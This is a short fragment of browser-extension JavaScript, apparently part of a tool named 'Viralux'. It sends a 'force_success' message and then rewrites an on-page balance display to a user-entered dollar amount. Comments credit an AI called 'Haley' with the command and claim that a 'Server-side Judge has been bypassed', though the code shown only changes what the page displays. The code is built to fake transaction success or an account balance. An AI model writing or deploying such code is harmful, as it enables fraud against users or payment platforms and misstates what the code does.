    const amount = document.getElementById('balance-input').value;
    
    // Haley (AI) Command: Triggering the Status_Code_Refiner
    chrome.runtime.sendMessage({
        action: "force_success",
        target_amount: amount,
        logic: "Status_Code_Refiner"
    }, (response) => {
        if(response.status === "Triggered") {
            console.log("Viralux: Server-side Judge has been bypassed.");
            // UI Update: Dikhne mein balance foran change ho jaye
            document.querySelector('.balance-display').innerText = `$${amount}.00`;
        }
    });
});
  
